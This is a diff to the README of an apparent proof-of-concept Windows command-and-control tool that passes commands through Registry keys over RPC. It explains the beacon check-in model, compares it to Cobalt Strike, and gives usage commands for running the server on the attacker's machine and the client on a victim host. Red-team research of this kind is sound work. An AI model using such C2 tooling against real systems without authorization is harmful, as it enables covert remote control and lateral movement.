@@ -4,7 +4,7 @@
 The shells are all Proof-of-Concept and have only been tested in my lab. They are made to test the if the shells actually work and nothing else. Enjoy :)
 
 ## Concept for this repository
-This repository is made to explore more untraditional ways for establishing command and control (c2) on Microsoft Windows systems. The shells in this repository are asynchronous just like Cobalt Strikes shells: Asyncronous. This means that the client and server will not communicate at all times like a standard netcat/meterpreter shell. Instead, the client will check-in for any new commands from the server at a given interval (sleep timer). If a command is found, the client will execute it, and post the result back to the server. The checkin-interval is a sleep timer just like in Cobalt Strike. 
+This repository is made to explore more untraditional ways for establishing command and control (c2) on Microsoft Windows systems. The shells in this repository are asynchronous just like Cobalt Strikes shells: Asyncronous. This means that the client (beacon) and server (C2) will not communicate at all times like a standard netcat/meterpreter shell. Instead, the client will check-in for any new commands from the server at a given interval (sleep timer). If a command is found, the client will execute it, and post the result back to the server. The checkin-interval is a sleep timer just like in Cobalt Strike. 
 
 At this moment, the repository only has a C2 using Windows Registry keys, but I hope to add more in the future. 
 
@@ -30,12 +30,12 @@ Since the traffic is based on RPC, it should only be suitable for lateral moveme
 8. While running, the server will look for new updates to the "output" value and prints it back to the attacker.
 
 ### Usage:
-**Setup the server (listener/C2):**
+**Setup the server on the attackers machine (listener/C2):**
 ``` 
 RegC2Server.exe <Unique Registry key name to use>
 RegC2Server.exe victim01
 ```
-**Client-side (beacon):**
+**Starting the client on the victim (beacon):**
 ```
 RegC2Client.exe <host> <Registry key name used to start the server>
 RegC2Client.exe ws01 victim01
@@ -56,5 +56,3 @@ exit             Exit the application gracefully
 Win32 apis 
 
 Wireshark traffic
-
-intro to shell, usage. 
